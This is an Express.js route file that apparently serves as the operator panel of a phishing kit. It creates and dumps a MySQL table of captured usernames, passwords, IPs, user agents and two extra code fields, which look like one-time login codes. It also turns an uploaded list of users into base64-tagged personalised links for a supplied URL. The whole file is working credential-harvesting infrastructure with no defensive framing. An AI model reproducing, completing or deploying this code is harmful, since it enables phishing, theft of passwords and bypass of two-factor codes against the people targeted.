const express = require('express');
const router = express.Router()
const db = require('../db');
const fs = require('fs');
const multer = require('multer');
const storage = multer.memoryStorage(); // Store the file in memory
const upload = multer({ storage: storage });





router.get("/", function(req, res,){

    res.render('index',{ message: '' });
});



router.post('/', (req, res) => {
  const { create, delete:newdel, getdata, genurl } = req.body;

if (create) {
      // Handle the "Create Table" button click
      // Your code for creating a table goes here

         
            const createTableSQL = `
            CREATE TABLE IF NOT EXISTS newtable (
              id INT AUTO_INCREMENT PRIMARY KEY,
              username VARCHAR(255),
              password VARCHAR(255),
              ip VARCHAR(255) NOT NULL,
              useragent VARCHAR(255) NOT NULL,
              date TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
              code VARCHAR(255),
              code2 VARCHAR(255),
              notify VARCHAR(20) DEFAULT 0
            )
            `;
  
                
                db.query(createTableSQL, (err, result) => {
            if (err) {
                console.error('Error creating table:', err);
            } else {
                console.log('Table created successfully');
            }
      
    });
      
    res.render('index', { message: 'Table Created' }); 
  
  } else if (newdel) {
    const tableName = 'newtable'; // Replace with the name of the table to delete

    // SQL query to delete the table
    const deleteQuery = `DROP TABLE ${tableName}`;
  
    // Execute the query to delete the table
    db.query(deleteQuery, (err, result) => {
        if (err) {
            console.error('Error deleting table:', err);
            return res.status(500).send('Internal Server Error');
        }
        res.render('index', { message: 'Table Deleted' }); 
    });
  } else if (getdata) {
      // Handle the "Get Data" button click
      // Your code for retrieving data goes here
      const query = 'SELECT * FROM newtable'; // Replace with your table name
  
    db.query(query, (err, results) => {
      if (err) {
        console.error('Error executing the query: ' + err.stack);
        return res.status(500).send('Error fetching data from the database.');
      }
   // Store the data in a variable
      const data = Object.values(JSON.parse(JSON.stringify(results)));
     
      res.render('table', {data});
  
    });
   } else if (genurl) {

    res.render('newurl');

  } else {
      // Handle any other case
      res.send('Unknown action');
  }
});

router.post('/upload', upload.single('textFile'), (req, res) => {
  // Access the uploaded file from req.file
  const url = req.body.url;
  const key = req.body.key;
  const uploadedFile = req.file;

  // Check if a file was uploaded
  if (!uploadedFile) {
      return res.status(400).send('No file uploaded.');
  }

  // Ensure the uploaded file is a text/plain file
  if (uploadedFile.mimetype !== 'text/plain') {
      return res.status(400).send('Only text files are allowed.');
  }

  // Read the content of the uploaded text file
  const fileContent = uploadedFile.buffer.toString('utf-8');
  const line = fileContent.split('\n');
  const b64user = line.map((str) => Buffer.from(str).toString('base64'));
  const links = b64user.map((str) => `${url}${key}${str}`);  
  res.render('url', { title:'USER LIST WITH URL', line, links });

  
  // Display the content in the response or perform other actions
  
  
});



module.exports = router;
